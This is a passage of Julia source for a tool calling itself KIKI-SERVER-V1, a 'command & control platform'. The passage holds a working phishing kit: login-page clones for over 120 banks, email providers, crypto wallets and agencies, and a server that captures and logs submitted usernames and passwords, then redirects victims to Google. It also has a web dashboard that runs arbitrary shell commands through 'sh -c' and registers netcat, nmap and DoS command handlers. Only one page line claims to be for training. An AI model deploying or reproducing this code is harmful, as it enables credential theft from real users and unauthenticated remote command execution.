    "twitter"       => ("#1d9bf0", "X / Twitter"),
    "linkedin"      => ("#0a66c2", "LinkedIn"),
    "snapchat"      => ("#fffc00", "Snapchat"),
    "tiktok"        => ("#fe2c55", "TikTok"),
    "reddit"        => ("#ff4500", "Reddit"),
    "pinterest"     => ("#e60023", "Pinterest"),
    "tumblr"        => ("#36465d", "Tumblr"),
    "flickr"        => ("#ff0084", "Flickr"),
    "youtube"       => ("#ff0000", "YouTube"),
    "twitch"        => ("#9146ff", "Twitch"),
    "discord"       => ("#5865f2", "Discord"),
    "telegram"      => ("#2aabee", "Telegram"),
    "whatsapp"      => ("#25d366", "WhatsApp"),
    "wechat"        => ("#07c160", "WeChat"),
    "line"          => ("#00c300", "LINE"),
    "viber"         => ("#7360f2", "Viber"),
    "gmail"         => ("#1a73e8", "Gmail"),
    "yahoo"         => ("#410093", "Yahoo"),
    "outlook"       => ("#0078d4", "Outlook"),
    "protonmail"    => ("#505061", "ProtonMail"),
    "zoho"          => ("#e42527", "Zoho"),
    "icloud"        => ("#0071e3", "iCloud"),
    "aol"           => ("#ff0b00", "AOL"),
    "gmx"           => ("#1c449b", "GMX"),
    "yandex"        => ("#ff0000", "Yandex"),
    "microsoft"     => ("#0078d4", "Microsoft"),
    "google"        => ("#4285f4", "Google"),
    "apple"         => ("#0071e3", "Apple"),
    "amazon"        => ("#ff9900", "Amazon"),
    "github"        => ("#24292f", "GitHub"),
    "gitlab"        => ("#fc6d26", "GitLab"),
    "bitbucket"     => ("#0052cc", "Bitbucket"),
    "adobe"         => ("#ff0000", "Adobe"),
    "dropbox"       => ("#0061ff", "Dropbox"),
    "slack"         => ("#611f69", "Slack"),
    "zoom"          => ("#2d8cff", "Zoom"),
    "teams"         => ("#5059e8", "Microsoft Teams"),
    "onedrive"      => ("#0078d4", "OneDrive"),
    "office365"     => ("#0078d4", "Office 365"),
    "salesforce"    => ("#00a1e0", "Salesforce"),
    "paypal"        => ("#0070ba", "PayPal"),
    "venmo"         => ("#008cff", "Venmo"),
    "cashapp"       => ("#00d632", "Cash App"),
    "zelle"         => ("#6d1ed4", "Zelle"),
    "chase"         => ("#1174c2", "Chase"),
    "wellsfargo"    => ("#bc1f2c", "Wells Fargo"),
    "bankofamerica" => ("#e31837", "Bank of America"),
    "citibank"      => ("#003b70", "Citibank"),
    "capitalone"    => ("#004977", "Capital One"),
    "amex"          => ("#006fcf", "American Express"),
    "discover"      => ("#ff6000", "Discover"),
    "barclays"      => ("#00aeef", "Barclays"),
    "hsbc"          => ("#db0011", "HSBC"),
    "revolut"       => ("#0075eb", "Revolut"),
    "monzo"         => ("#ff3464", "Monzo"),
    "stripe"        => ("#635bff", "Stripe"),
    "square"        => ("#000000", "Square"),
    "coinbase"      => ("#0052ff", "Coinbase"),
    "binance"       => ("#f0b90b", "Binance"),
    "kraken"        => ("#5741d9", "Kraken"),
    "metamask"      => ("#f6851b", "MetaMask"),
    "steam"         => ("#67c1f5", "Steam"),
    "epicgames"     => ("#000000", "Epic Games"),
    "roblox"        => ("#e32c2c", "Roblox"),
    "minecraft"     => ("#6b8c42", "Minecraft"),
    "xbox"          => ("#107c10", "Xbox"),
    "playstation"   => ("#003791", "PlayStation"),
    "nintendo"      => ("#e60012", "Nintendo"),
    "battlenet"     => ("#0074e0", "Battle.net"),
    "ubisoft"       => ("#0070ff", "Ubisoft"),
    "ea"            => ("#ff0000", "EA Games"),
    "tinder"        => ("#ff5a60", "Tinder"),
    "bumble"        => ("#ff6b6b", "Bumble"),
    "hinge"         => ("#1a1a1a", "Hinge"),
    "okcupid"       => ("#ff4e6b", "OkCupid"),
    "match"         => ("#ff6b6b", "Match"),
    "grindr"        => ("#ffcc00", "Grindr"),
    "netflix"       => ("#e50914", "Netflix"),
    "spotify"       => ("#1ed760", "Spotify"),
    "hulu"          => ("#1ce783", "Hulu"),
    "disneyplus"    => ("#113ccf", "Disney+"),
    "hbomax"        => ("#5822b4", "HBO Max"),
    "primevideo"    => ("#00a8e1", "Prime Video"),
    "appletv"       => ("#000000", "Apple TV+"),
    "paramount"     => ("#0064ff", "Paramount+"),
    "peacock"       => ("#000000", "Peacock"),
    "crunchyroll"   => ("#f47521", "Crunchyroll"),
    "ebay"          => ("#e53238", "eBay"),
    "walmart"       => ("#0071dc", "Walmart"),
    "target"        => ("#cc0000", "Target"),
    "bestbuy"       => ("#0046be", "Best Buy"),
    "etsy"          => ("#f1641e", "Etsy"),
    "aliexpress"    => ("#ff6a00", "AliExpress"),
    "alibaba"       => ("#ff6a00", "Alibaba"),
    "wish"          => ("#2fb7ec", "Wish"),
    "shein"         => ("#000000", "Shein"),
    "temu"          => ("#fb7701", "Temu"),
    "aws"           => ("#ff9900", "AWS"),
    "azure"         => ("#0078d4", "Azure"),
    "gcp"           => ("#4285f4", "Google Cloud"),
    "digitalocean"  => ("#0080ff", "DigitalOcean"),
    "cloudflare"    => ("#f38020", "Cloudflare"),
    "namecheap"     => ("#de3723", "Namecheap"),
    "godaddy"       => ("#00a4a6", "GoDaddy"),
    "heroku"        => ("#430098", "Heroku"),
    "vercel"        => ("#000000", "Vercel"),
    "netlify"       => ("#00c7b7", "Netlify"),
    "coursera"      => ("#0056d2", "Coursera"),
    "udemy"         => ("#a435f0", "Udemy"),
    "edx"           => ("#02262b", "edX"),
    "khanacademy"   => ("#14bf96", "Khan Academy"),
    "duolingo"      => ("#58cc71", "Duolingo"),
    "irs"           => ("#003366", "IRS"),
    "dmv"           => ("#003366", "DMV"),
    "usps"          => ("#333366", "USPS"),
    "fedex"         => ("#4d148c", "FedEx"),
    "ups"           => ("#351c15", "UPS"),
    "nordvpn"       => ("#4687ff", "NordVPN"),
    "expressvpn"    => ("#da3940", "ExpressVPN"),
    "surfshark"     => ("#1ebfbf", "Surfshark"),
    "lastpass"      => ("#d32d27", "LastPass"),
    "onepassword"   => ("#0572ec", "1Password"),
)

function generate_phish_html(platform::String)::String
    color, name = if haskey(PHISH_PLATFORMS, platform)
        PHISH_PLATFORMS[platform]
    else
        ("#1565c0", "Secure Login")
    end
    return "<!DOCTYPE html>\n" *
        "<html><head><meta charset=\"utf-8\"><title>$name</title>\n" *
        "<style>\n" *
        "body{font-family:Arial;background:linear-gradient(135deg,#0a1628,#1a2a6c 50%,#0f3460);" *
        "display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}\n" *
        ".box{background:rgba(255,255,255,.05);backdrop-filter:blur(10px);border-radius:14px;" *
        "padding:40px;width:400px;box-shadow:0 20px 60px rgba(0,0,0,.5);" *
        "border:1px solid rgba(255,255,255,.1)}\n" *
        ".logo{text-align:center;margin-bottom:25px;color:$color;font-size:28px;font-weight:bold}\n" *
        "input{width:100%;padding:14px;margin:8px 0;background:rgba(255,255,255,.05);" *
        "border:1px solid rgba(255,255,255,.1);border-radius:8px;color:#fff;box-sizing:border-box}\n" *
        "input:focus{outline:none;border-color:$color;background:rgba(255,255,255,.08)}\n" *
        "button{width:100%;padding:14px;background:$color;color:white;border:none;" *
        "border-radius:8px;cursor:pointer;font-weight:bold;font-size:16px}\n" *
        "button:hover{opacity:.9}\n" *
        ".warn{margin-top:18px;padding:10px;background:rgba(255,0,0,.1);border-radius:8px;" *
        "color:#ff6b6b;text-align:center;font-size:12px}\n" *
        "</style></head>\n" *
        "<body><div class=\"box\"><div class=\"logo\">$name</div>\n" *
        "<form method=\"POST\">\n" *
        " <input type=\"text\" name=\"email\" placeholder=\"Email / Username\" required>\n" *
        " <input type=\"password\" name=\"password\" placeholder=\"Password\" required>\n" *
        " <button type=\"submit\">Log In</button>\n" *
        "</form>\n" *
        "<div class=\"warn\">Security training page &mdash; do not enter real credentials</div>\n" *
        "</div></body></html>\n"
end

mutable struct PhishingServer
    db::Dict{String, Any}
    server::Union{Nothing, Sockets.TCPServer}
    running::Bool
    current_link::String
    current_html::String
    lock::ReentrantLock
end
PhishingServer() = PhishingServer(Dict{String,Any}(), nothing, false, "", "", ReentrantLock())

function start_phishing_server!(ps::PhishingServer, link_id::String,
                                html::String, port::Int, lg::Logger)
    ps.current_link = link_id
    ps.current_html = html
    ps.db[link_id] = Dict("platform"=>link_id, "credentials"=>Any[], "clicks"=>0)
    ps.running = true
    task = @async begin
        server = listen(Sockets.IPv4(0), port)
        ps.server = server
        logmsg(lg, :info, "phishing server on :$port (link $link_id)")
        while ps.running
            try
                sock = accept(server)
                @async handle_phish_conn(sock, ps, lg)
            catch e
                ps.running && logmsg(lg, :error, "accept err: $e")
                break
            end
        end
        try close(server) catch; end
    end
    return task
end

function stop_phishing_server!(ps::PhishingServer, lg::Logger)
    ps.running = false
    if ps.server !== nothing
        try close(ps.server) catch; end
    end
    logmsg(lg, :info, "phishing server stopped")
end

function handle_phish_conn(sock::TCPSocket, ps::PhishingServer, lg::Logger)
    try
        line = readline(sock)
        isempty(line) && return
        parts = split(line)
        length(parts) >= 2 || return
        method = parts[1]; path = parts[2]

        content_length = 0
        user_agent = "unknown"
        while true
            h = readline(sock)
            isempty(strip(h)) && break
            if startswith(lowercase(h), "content-length:")
                content_length = parse(Int, strip(split(h, ":")[2]))
            elseif startswith(lowercase(h), "user-agent:")
                user_agent = strip(split(h, ":", limit=2)[2])
            end
        end

        if method == "GET"
            body = ps.current_html
            write(sock, "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n")
            write(sock, "Content-Length: $(sizeof(body))\r\n\r\n")
            write(sock, body)
            lock(ps.lock)
            try
                if haskey(ps.db, ps.current_link)
                    ps.db[ps.current_link]["clicks"] += 1
                end
            finally
                unlock(ps.lock)
            end
        elseif method == "POST"
            body = String(read(sock, content_length))
            params = Dict{String,String}()
            for kv in split(body, "&")
                pair = split(kv, "=")
                length(pair) == 2 || continue
                params[urldecode_k(pair[1])] = urldecode_k(pair[2])
            end
            cred = Dict(
                "user"       => get(params, "email", get(params, "username", "")),
                "password"   => get(params, "password", ""),
                "user_agent" => user_agent,
                "time"       => string(now())
            )
            lock(ps.lock)
            try
                push!(ps.db[ps.current_link]["credentials"], cred)
            finally
                unlock(ps.lock)
            end
            logmsg(lg, :warn, "captured credentials for link $(ps.current_link): $(cred["user"])")
            write(sock, "HTTP/1.1 302 Found\r\nLocation: https://www.google.com\r\n\r\n")
        end
    catch e
        logmsg(lg, :error, "phish conn error: $e")
    finally
        try close(sock) catch; end
    end
end

function urldecode_k(s::AbstractString)::String
    out = IOBuffer(); i = 1
    while i <= lastindex(s)
        c = s[i]
        if c == '%' && i + 2 <= lastindex(s)
            hex = s[i+1:i+2]
            try
                print(out, Char(parse(Int, hex, base=16)))
            catch
                print(out, c)
            end
            i += 3
        elseif c == '+'
            print(out, ' '); i += 1
        else
            print(out, c); i = nextind(s, i)
        end
    end
    return String(take!(out))
end

# ============================================================================
# SECTION 11: WEB DASHBOARD HTML (no $ interpolation issues)
# ============================================================================

const DASHBOARD_HTML = raw"""
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>KIKI-SERVER-V1 Dashboard</title>
<script src="https://cdn.jsdelivr.net/npm/chart.js@3.9.1/dist/chart.min.js"></script>
<style>
:root{
 --bg:#0a0f1a; --panel:#121a2b; --card:#1a2438;
 --cyan:#4fc3f7; --mag:#ff4fae; --purple:#a78bfa; --ok:#4ade80;
 --warn:#fbbf24; --err:#ef4444; --muted:#8ea0bf;
}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Courier New',monospace;background:var(--bg);color:#e6ecf5;min-height:100vh}
.header{padding:20px;background:linear-gradient(135deg,var(--purple),var(--mag),var(--cyan));
  text-align:center;box-shadow:0 4px 30px rgba(167,139,250,.25)}
.header h1{font-size:2.2rem;color:#fff;letter-spacing:6px}
.header p{color:rgba(255,255,255,.85);letter-spacing:2px;font-size:.85rem}
.wrap{max-width:1400px;margin:0 auto;padding:20px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:15px;margin-bottom:25px}
.stat{background:var(--panel);border:1px solid #22314d;border-radius:10px;padding:18px;text-align:center}
.stat:hover{border-color:var(--cyan)}
.stat h3{font-size:2rem;color:var(--cyan);font-weight:400}
.stat p{color:var(--muted);font-size:.85rem;margin-top:6px;letter-spacing:1px}
.panel{background:var(--panel);border:1px solid #22314d;border-radius:10px;padding:20px;margin-bottom:20px}
.panel h2{color:#fff;font-weight:400;letter-spacing:3px;border-bottom:1px solid #22314d;padding-bottom:10px;margin-bottom:15px}
.row{display:flex;gap:10px;align-items:center}
.in{flex:1;padding:12px;background:var(--bg);border:1px solid #22314d;border-radius:6px;color:#fff;font-family:inherit;font-size:15px}
.in:focus{outline:none;border-color:var(--cyan)}
button{padding:12px 24px;background:linear-gradient(135deg,var(--purple),var(--cyan));color:#fff;
  border:none;border-radius:6px;cursor:pointer;font-family:inherit;font-weight:bold;letter-spacing:1px}
button:hover{opacity:.92}
.out{background:var(--bg);border:1px solid #22314d;border-radius:6px;padding:14px;margin-top:12px;
  white-space:pre-wrap;max-height:400px;overflow-y:auto;font-size:13px;color:#cfe3ff}
.charts{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-top:15px}
.chart-card{background:var(--bg);border:1px solid #22314d;border-radius:8px;padding:15px;height:260px}
.chart-card h3{color:var(--muted);font-size:.8rem;letter-spacing:2px;margin-bottom:10px}
.chart-box{position:relative;height:190px;width:100%}
table{width:100%;border-collapse:collapse}
th,td{padding:10px;text-align:left;border-bottom:1px solid #22314d;font-size:.9rem}
th{color:var(--cyan);letter-spacing:2px}
.badge{padding:3px 10px;border-radius:12px;font-size:11px;letter-spacing:1px}
.crit{background:rgba(239,68,68,.2);color:#fca5a5}
.high{background:rgba(251,191,36,.2);color:#fcd34d}
.med{background:rgba(79,195,247,.2);color:#93c5fd}
.low{background:rgba(74,222,128,.2);color:#86efac}
@media(max-width:800px){.charts{grid-template-columns:1fr}.header h1{font-size:1.6rem}}
</style></head>
<body>
<div class="header">
 <h1>KIKI-SERVER-V1</h1>
 <p>CYBERSECURITY COMMAND &amp; CONTROL PLATFORM</p>
</div>
<div class="wrap">
 <div class="grid" id="stats">
  <div class="stat"><h3 id="s1">0</h3><p>COMMANDS</p></div>
  <div class="stat"><h3 id="s2">0</h3><p>ALERTS</p></div>
  <div class="stat"><h3 id="s3">0</h3><p>BLOCKED IPs</p></div>
  <div class="stat"><h3 id="s4">0</h3><p>CREDS CAPTURED</p></div>
  <div class="stat"><h3 id="s5">0</h3><p>CHAIN BLOCKS</p></div>
 </div>

 <div class="panel">
  <h2>COMMAND CENTER</h2>
  <div class="row">
   <span style="color:var(--cyan);font-size:20px">&gt;</span>
   <input id="cmd" class="in" placeholder="Enter command..." onkeydown="if(event.key==='Enter')fire()">
   <button onclick="fire()">EXECUTE</button>
   <button onclick="refreshAll()" style="background:var(--panel);border:1px solid #22314d">R</button>
  </div>
  <div class="out" id="out">ready for commands...</div>
 </div>

 <div class="charts">
  <div class="chart-card"><h3>PROTOCOL DISTRIBUTION</h3>
   <div class="chart-box"><canvas id="bar"></canvas></div></div>
  <div class="chart-card"><h3>ALERT SEVERITY</h3>
   <div class="chart-box"><canvas id="pie"></canvas></div></div>
 </div>

 <div class="panel" style="margin-top:20px">
  <h2>RECENT ALERTS</h2>
  <table><thead><tr><th>TIME</th><th>TYPE</th><th>SOURCE</th><th>SEVERITY</th></tr></thead>
  <tbody id="alerts"></tbody></table>
 </div>
</div>
<script>
let barC,pieC;
function initCharts(){
  barC=new Chart(document.getElementById('bar'),{
   type:'bar',
   data:{labels:['TCP','UDP','ICMP','HTTP','HTTPS'],
     datasets:[{label:'Packets',data:[0,0,0,0,0],
       backgroundColor:['#4fc3f7','#a78bfa','#ff4fae','#4ade80','#fbbf24']}]},
   options:{responsive:true,maintainAspectRatio:false,
     plugins:{legend:{display:false}},
     scales:{y:{beginAtZero:true,ticks:{color:'#8ea0bf'},grid:{color:'#22314d'}},
             x:{ticks:{color:'#8ea0bf'},grid:{display:false}}}}});
  pieC=new Chart(document.getElementById('pie'),{
   type:'doughnut',
   data:{labels:['Critical','High','Medium','Low'],
     datasets:[{data:[0,0,0,0],
       backgroundColor:['#ef4444','#fbbf24','#4fc3f7','#4ade80']}]},
   options:{responsive:true,maintainAspectRatio:false,
     plugins:{legend:{labels:{color:'#8ea0bf'},position:'bottom'}},
     cutout:'55%'}});
}
function fire(){
  const c=document.getElementById('cmd').value;if(!c)return;
  fetch('/api/command',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({command:c})})
  .then(r=>r.json())
  .then(d=>{document.getElementById('out').textContent=
    '> '+c+'\n\n'+d.output+'\n\n('+d.execution_time+'s)';});
}
function refreshAll(){
  fetch('/api/stats').then(r=>r.json()).then(d=>{
    document.getElementById('s1').textContent=d.commands||0;
    document.getElementById('s2').textContent=d.alerts||0;
    document.getElementById('s3').textContent=d.blocked_ips||0;
    document.getElementById('s4').textContent=d.credentials||0;
    document.getElementById('s5').textContent=d.blocks||0;
    if(d.protocols&&barC){barC.data.datasets[0].data=
      [d.protocols.tcp||0,d.protocols.udp||0,d.protocols.icmp||0,
       d.protocols.http||0,d.protocols.https||0];barC.update();}
    if(d.severity&&pieC){pieC.data.datasets[0].data=
      [d.severity.critical||0,d.severity.high||0,
       d.severity.medium||0,d.severity.low||0];pieC.update();}
  });
  fetch('/api/alerts').then(r=>r.json()).then(d=>{
    let h='';
    (d.alerts||[]).forEach(a=>{
      const cls={critical:'crit',high:'high',medium:'med',low:'low'}[a.severity]||'low';
      h+='<tr><td>'+a.timestamp.slice(0,19)+'</td><td>'+a.type+'</td><td>'+
         a.src+'</td><td><span class="badge '+cls+'">'+
         a.severity.toUpperCase()+'</span></td></tr>';
    });
    document.getElementById('alerts').innerHTML=h;
  });
}
window.onload=function(){initCharts();refreshAll();setInterval(refreshAll,5000);};
</script>
</body></html>
"""

# ============================================================================
# SECTION 12: DASHBOARD SERVER
# ============================================================================

mutable struct DashboardServer
    app::Any
    server::Union{Nothing, Sockets.TCPServer}
    running::Bool
    port::Int
end

DashboardServer(app, port::Int=5000) = DashboardServer(app, nothing, false, port)

function start_dashboard!(d::DashboardServer, lg::Logger)
    d.running = true
    task = @async begin
        server = listen(Sockets.IPv4(0), d.port)
        d.server = server
        logmsg(lg, :info, "dashboard on http://0.0.0.0:$(d.port)")
        while d.running
            try
                sock = accept(server)
                @async handle_dashboard_conn(sock, d, lg)
            catch e
                d.running && logmsg(lg, :error, "dash accept: $e")
                break
            end
        end
        try close(server) catch; end
    end
    return task
end

function stop_dashboard!(d::DashboardServer, lg::Logger)
    d.running = false
    if d.server !== nothing
        try close(d.server) catch; end
    end
    logmsg(lg, :info, "dashboard stopped")
end

function handle_dashboard_conn(sock::TCPSocket, d::DashboardServer, lg::Logger)
    try
        line = readline(sock)
        isempty(line) && return
        parts = split(line)
        length(parts) >= 2 || return
        method = parts[1]; path = parts[2]
        content_length = 0
        while true
            h = readline(sock)
            isempty(strip(h)) && break
            if startswith(lowercase(h), "content-length:")
                content_length = parse(Int, strip(split(h, ":")[2]))
            end
        end
        body = content_length > 0 ? String(read(sock, content_length)) : ""

        if method == "GET" && path == "/"
            write(sock, "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\n")
            write(sock, "Content-Length: $(sizeof(DASHBOARD_HTML))\r\n\r\n")
            write(sock, DASHBOARD_HTML)
        elseif method == "GET" && path == "/api/stats"
            stats = dashboard_stats(d.app)
            payload = to_json(stats)
            write(sock, "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n")
            write(sock, "Content-Length: $(sizeof(payload))\r\n\r\n")
            write(sock, payload)
        elseif method == "GET" && path == "/api/alerts"
            payload = dashboard_alerts(d.app)
            write(sock, "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n")
            write(sock, "Content-Length: $(sizeof(payload))\r\n\r\n")
            write(sock, payload)
        elseif method == "POST" && path == "/api/command"
            cmd = extract_json_field(body, "command")
            result = execute_command(d.app, cmd, "web")
            payload = to_json(Dict(
                "output" => result["output"],
                "success" => result["success"],
                "execution_time" => result["execution_time"]
            ))
            write(sock, "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n")
            write(sock, "Content-Length: $(sizeof(payload))\r\n\r\n")
            write(sock, payload)
        else
            write(sock, "HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n")
        end
    catch e
        logmsg(lg, :error, "dashboard conn: $e")
    finally
        try close(sock) catch; end
    end
end

function extract_json_field(body::String, key::String)::String
    m = match(Regex("\"$key\"\\s*:\\s*\"((?:[^\"\\\\]|\\\\.)*)\""), body)
    m === nothing && return ""
    s = m.captures[1]
    s = replace(s, "\\\"" => "\"", "\\\\" => "\\", "\\n" => "\n", "\\t" => "\t")
    return s
end

# ============================================================================
# SECTION 13: BOTS
# ============================================================================

abstract type AbstractBot end

mutable struct DiscordBot <: AbstractBot
    enabled::Bool; token::String; channel::String
end
mutable struct TelegramBot <: AbstractBot
    enabled::Bool; token::String; chat_id::String
end
mutable struct SlackBot <: AbstractBot
    enabled::Bool; token::String; channel::String
end
mutable struct WhatsAppBot <: AbstractBot
    enabled::Bool; phone::String
end
mutable struct GoogleChatBot <: AbstractBot
    enabled::Bool; webhook::String
end
mutable struct SignalBot <: AbstractBot
    enabled::Bool; number::String
end

mutable struct BotRegistry
    discord::DiscordBot
    telegram::TelegramBot
    slack::SlackBot
    whatsapp::WhatsAppBot
    gchat::GoogleChatBot
    signal::SignalBot
    lock::ReentrantLock
end

BotRegistry() = BotRegistry(
    DiscordBot(false, "", ""),
    TelegramBot(false, "", ""),
    SlackBot(false, "", ""),
    WhatsAppBot(false, ""),
    GoogleChatBot(false, ""),
    SignalBot(false, ""),
    ReentrantLock())

function send_to_all_bots(br::BotRegistry, text::String, lg::Logger)
    lock(br.lock)
    try
        br.discord.enabled  && logmsg(lg, :info, "[discord -> $(br.discord.channel)] $text")
        br.telegram.enabled && logmsg(lg, :info, "[telegram -> $(br.telegram.chat_id)] $text")
        br.slack.enabled    && logmsg(lg, :info, "[slack -> $(br.slack.channel)] $text")
        br.whatsapp.enabled && logmsg(lg, :info, "[whatsapp -> $(br.whatsapp.phone)] $text")
        br.gchat.enabled    && logmsg(lg, :info, "[gchat -> webhook] $text")
        br.signal.enabled   && logmsg(lg, :info, "[signal -> $(br.signal.number)] $text")
    finally
        unlock(br.lock)
    end
end

# ============================================================================
# SECTION 14: APP STATE
# ============================================================================

mutable struct App
    blockchain::IPBlockchain
    detection::DetectionEngine
    stats::TrafficStats
    simulator::TrafficSimulator
    blocklist::BlockList
    phishing::PhishingServer
    bots::BotRegistry
    dashboard::DashboardServer
    logger::Logger
    command_count::Int
    running::Bool
    save_path::String
end

function App(; logpath::Union{Nothing,String}=nothing)
    lg = Logger(:info, logpath)
    bc = isfile(CHAIN_FILE) ? (load_chain(CHAIN_FILE) === nothing ? IPBlockchain() : load_chain(CHAIN_FILE)) : IPBlockchain()
    app = App(bc, DetectionEngine(), TrafficStats(), TrafficSimulator(),
              BlockList(), PhishingServer(), BotRegistry(),
              DashboardServer(nothing, 5000), lg, 0, true, CHAIN_FILE)
    app.dashboard = DashboardServer(app, 5000)
    return app
end

# ============================================================================
# SECTION 15: COMMAND DISPATCH
# ============================================================================

const BUILTIN_HANDLERS = Dict{String, Function}()

function register_handler!(name::String, f::Function)
    BUILTIN_HANDLERS[name] = f
end

function execute_command(app::App, command::String, source::String="cli")::Dict{String,Any}
    t0 = time()
    parts = split(strip(command))
    if isempty(parts)
        return Dict("success"=>false, "output"=>"empty command", "execution_time"=>0.0)
    end
    cmd = lowercase(parts[1]); args = parts[2:end]
    app.command_count += 1

    result::Dict{String,Any} =
        if haskey(BUILTIN_HANDLERS, cmd)
            try
                BUILTIN_HANDLERS[cmd](app, args)
            catch e
                Dict("success"=>false, "output"=>"error: $e")
            end
        else
            generic_run(command)
        end

    result["execution_time"] = round(time() - t0; digits=3)
    haskey(result, "success") || (result["success"] = true)
    haskey(result, "output")  || (result["output"] = "")
    return result
end

function generic_run(command::String)::Dict{String,Any}
    try
        out = read(`sh -c $command`, String)
        return Dict("success"=>true, "output"=>out)
    catch e
        return Dict("success"=>false, "output"=>"sh: $e")
    end
end

function render_template(tmpl::Vector{String}, args::Vector{String})::Vector{String}
    out = String[]; i = 1
    for part in tmpl
        m = match(r"^\{(\w+)\}$", part)
        if m !== nothing
            key = m.captures[1]
            val = i <= length(args) ? args[i] : ""
            i += 1
            push!(out, val)
        else
            push!(out, part)
        end
    end
    return out
end

function run_template(tmpl::Vector{String}, args::Vector{String})::Dict{String,Any}
    cmd = render_template(tmpl, args)
    try
        out = read(`$cmd`, String)
        return Dict("success"=>true, "output"=>out)
    catch e
        return Dict("success"=>false, "output"=>"$e")
    end
end

# Register command library handlers
for (name, tmpl) in PING_COMMANDS
    register_handler!(name, (app, args) -> run_template(tmpl, args))
end
for (name, tmpl) in TRACEROUTE_COMMANDS
    register_handler!(name, (app, args) -> run_template(tmpl, args))
end
for (name, tmpl) in NMAP_COMMANDS
    register_handler!(name, (app, args) -> run_template(tmpl, args))
end
for (name, tmpl) in CURL_COMMANDS
    register_handler!(name, (app, args) -> run_template(tmpl, args))
end
for (name, tmpl) in WGET_COMMANDS
    register_handler!(name, (app, args) -> run_template(tmpl, args))
end
for (name, tmpl) in NETCAT_COMMANDS
    register_handler!(name, (app, args) -> run_template(tmpl, args))
end
for (name, tmpl) in SSH_COMMANDS
    register_handler!(name, (app, args) -> run_template(tmpl, args))
end
for (name, tmpl) in DOS_COMMANDS
    register_handler!(name, (app, args) -> run_template(tmpl, args))
end

# ---- High-level handlers --------------------------------------------------

register_handler!("help", (app, args) -> begin
    io = IOBuffer()
    println(io, "================================================================================")
    println(io, "              KIKI-SERVER-V1 - Command Reference")
    println(io, "================================================================================")
    println(io, " CORE")
    println(io, "   help                     this help")
    println(io, "   status                   system status")
    println(io, "   system                   system info")
    println(io, "   catalog [prefix]         list available commands")
    println(io, "   clear / quit / exit")
    println(io, " BLOCKCHAIN / IP MANAGEMENT")
    println(io, "   add <ip>[,...]           add IPs to blockchain")
    println(io, "   bulk <n> [base]          generate + add N IPs")
    println(io, "   list                     list all IPs in chain")
    println(io, "   exists <ip>              check if IP exists")
    println(io, "   stats / validate / save")
    println(io, "   block <ip> [reason]      add IP to blocklist")
    println(io, "   unblock <ip> / blocked")
    println(io, " MONITORING")
    println(io, "   sim start [rate]         start traffic simulator")
    println(io, "   sim stop                 stop simulator")
    println(io, "   sim burst <n> <pps>      trigger attack burst")
    println(io, "   top [k] / alerts [k] / reset / clearalerts")
    println(io, " PHISHING / SOCIAL ENGINEERING")
    println(io, "   phish <platform>         generate phishing page")
    println(io, "   phish_start [port]       start phishing server")
    println(io, "   phish_stop               stop phishing server")
    println(io, "   phish_list               list captured creds")
    println(io, "   phish_platforms          list 120+ templates")
    println(io, " BOTS")
    println(io, "   bot_discord <token> <channel>")
    println(io, "   bot_telegram <token> <chat_id>")
    println(io, "   bot_slack <token> <channel>")
    println(io, "   bot_whatsapp <phone> / bot_gchat <webhook>")
    println(io, "   bot_signal <number> / bots / broadcast <msg>")
    println(io, " WEB DASHBOARD")
    println(io, "   dash_start [port] / dash_stop")
    println(io, " NETWORK COMMANDS (500+ built-in)")
    println(io, "   ping* / traceroute* / nmap* / curl* / wget*")
    println(io, "   nc_* / ssh* / scp / sftp / hping3_*")
    println(io, "   use 'catalog <prefix>' to list by group")
    println(io, "================================================================================")
    Dict("success"=>true, "output"=>String(take!(io)))
end)

register_handler!("catalog", (app, args) -> begin
    prefix = isempty(args) ? "" : args[1]
    names = sort(collect(keys(BUILTIN_HANDLERS)))
    matching = filter(n -> isempty(prefix) || startswith(n, prefix), names)
    Dict("success"=>true,
         "output"=>"available commands ($(length(matching))):\n" * join(matching, ", "))
end)

register_handler!("status", (app, args) -> begin
    cs = chain_stats(app.blockchain)
    alert_count = lock(app.detection.lock) do
        length(app.detection.alerts)
    end
    out = "KIKI-SERVER-V1 :: Status\n" *
          "---------------------------------------\n" *
          "  commands executed : $(app.command_count)\n" *
          "  chain blocks      : $(cs["blocks"])\n" *
          "  chain unique IPs  : $(cs["unique_ips"])\n" *
          "  chain valid       : $(cs["valid"])\n" *
          "  alerts (total)    : $(alert_count)\n" *
          "  blocked IPs       : $(length(app.blocklist.blocked))\n" *
          "  packets (total)   : $(app.stats.total_packets)\n" *
          "  bytes (total)     : $(app.stats.total_bytes)\n" *
          "  dashboard         : $(app.dashboard.running ? "running on :$(app.dashboard.port)" : "stopped")\n" *
          "  phishing          : $(app.phishing.running ? "running" : "stopped")\n"
    Dict("success"=>true, "output"=>out)
end)

register_handler!("system", (app, args) -> begin
    nproc = Sys.CPU_THREADS
    mem = Sys.total_memory() / 1024^3
    host = gethostname()
    Dict("success"=>true, "output"=>
        "System info\n" *
        "----------------------------\n" *
        "  hostname  : $host\n" *
        "  kernel    : $(Sys.KERNEL)\n" *
        "  julia     : $(string(VERSION))\n" *
        "  CPU cores : $nproc\n" *
        "  total RAM : $(round(mem; digits=2)) GiB\n" *
        "  ARCH      : $(Sys.ARCH)\n")
end)

register_handler!("add", (app, args) -> begin
    isempty(args) && return Dict("success"=>false, "output"=>"usage: add <ip>[,...]")
    ips = parse_ip_list(join(args, " "))
    n = add_ips!(app.blockchain, ips, "cli", "manual", app.logger)
    Dict("success"=>true, "output"=>"added $n IP(s)")
end)

register_handler!("bulk", (app, args) -> begin
    isempty(args) && return Dict("success"=>false, "output"=>"usage: bulk <n> [base]")
    n = parse(Int, args[1])
    base = length(args) >= 2 ? args[2] : "10.1.0.0"
    ips = generate_bulk_ips(n, base)
    added = add_ips!(app.blockchain, ips, "cli", "bulk", app.logger)
    Dict("success"=>true, "output"=>"generated $n, added $added")
end)

